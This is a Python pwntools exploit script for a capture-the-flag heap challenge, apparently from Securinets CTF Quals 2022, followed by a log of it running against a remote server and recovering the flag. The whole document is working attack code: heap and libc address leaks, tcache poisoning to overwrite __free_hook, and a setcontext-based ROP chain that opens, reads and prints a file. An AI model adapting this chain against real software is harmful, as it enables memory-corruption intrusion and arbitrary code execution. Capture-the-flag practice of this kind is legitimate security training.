from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './memory'
context.binary = elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "20.216.39.14"
  PORT = 1235
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  libc = elf.libc
  
def Read(where):
  s.sendlineafter(">> ", "1")
  s.sendlineafter(">> ", hex(where)) 

def Write(where, data):
  s.sendlineafter(">> ", "2")
  s.sendlineafter(">> ", hex(where)) 
  s.sendlineafter(">> ", hex(data))
  
def Alloc(size, data): 
  s.sendlineafter(">> ", "3")
  s.sendlineafter(">> ", str(size)) 
  s.sendafter(">> ", data)
  
def Free():
  s.sendlineafter(">> ", "4")

def View():
  s.sendlineafter(">> ", "5")

Alloc(0x10, "\n")
View()
heap_leak = u64(s.recv(6)+b"\x00\x00")
heap_base = heap_leak - 0x220a
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

Alloc(1100, "A"*4)
Free()
Write(heap_base+0x20a0, heap_base+0x1ef0)
Alloc(0x60, "\n")
Alloc(0x60, "\n")
Alloc(0x60, "\n")
Alloc(0x68, p64(0)*11+p64(0xf1))

Alloc(0xe0, "\n")
Alloc(0xe0, "A"*15+"\n")
View()
s.recvuntil("A"*15+"\n")
libc_leak = u64(s.recv(6)+b"\x00\x00")
libc_base = libc_leak - 0x1ecc40
free_hook = libc_base + libc.sym.__free_hook
#malloc_hook = libc_base + libc.sym.__malloc_hook

setcontext = libc_base + libc.sym.setcontext
mov_rdx_rdi = libc_base + 0x1518b0 # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
ret_addr     = libc_base + 0x22679 # ret;
syscall_ret  = libc_base + 0x630d9 # syscall; ret;
pop_rax_ret  = libc_base + 0x47400 # pop rax; ret;
pop_rdi_ret  = libc_base + 0x23b72 # pop rdi; ret;
pop_rsi_ret  = libc_base + 0x2604f # pop rsi; ret;
pop_rdx_ret  = libc_base + 0x119241 # pop rdx; pop r12; ret;
xchg_eax_edi = libc_base + 0xf1b95 # xchg eax, edi; ret;

print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

Free()
Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))

for i in range(5):
  Alloc(0x70, "\n")

buf  = b"A"*0x20
buf += p64(setcontext+61)
buf += b"B"*0x78
buf += p64(heap_base + 0x2370) # rsp
buf += p64(ret_addr)           # rcx  
buf += p64(pop_rax_ret)
buf += p64(2)
buf += p64(pop_rdi_ret)
buf += p64(heap_base + 0x2418)
buf += p64(pop_rsi_ret)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rdi_ret)
buf += p64(0)
buf += p64(xchg_eax_edi)
buf += p64(pop_rsi_ret)
buf += p64(heap_base + 0x4000)
buf += p64(pop_rdx_ret)
buf += p64(0x80)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(1)
buf += p64(pop_rdi_ret)
buf += p64(1)
buf += p64(syscall_ret)
buf += b"./flag.txt\x00"
Alloc(0x200, buf)

Alloc(0x70, p64(0)+p64(heap_base+0x22c0)+p64(mov_rdx_rdi))
Free()

s.interactive()

'''
mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Memory$ python3 solve.py r
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/memory'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 20.216.39.14 on port 1235: Done
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
solve.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter(">> ", "3")
/home/mito/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees.s
  res = self.recvuntil(delim, timeout=timeout)
solve.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter(">> ", str(size))
solve.py:31: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendafter(">> ", data)
/home/mito/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:812: BytesWarning: Text is not bytes; assuming ASCII, no guarantees.s
  res = self.recvuntil(delim, timeout=timeout)
solve.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter(">> ", "5")
heap_leak = 0x564b41f2020a
heap_base = 0x564b41f1e000
solve.py:34: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter(">> ", "4")
solve.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter(">> ", "2")
solve.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter(">> ", hex(where))
solve.py:26: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendlineafter(">> ", hex(data))
solve.py:57: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("A"*15+"\n")
libc_leak = 0x7f131dcb4c40
libc_base = 0x7f131dac8000
[*] Switching to interactive mode
Securinets{397b5541d6dacf89123c5a24eea45cb7cc526dade67d4a70}   
'''
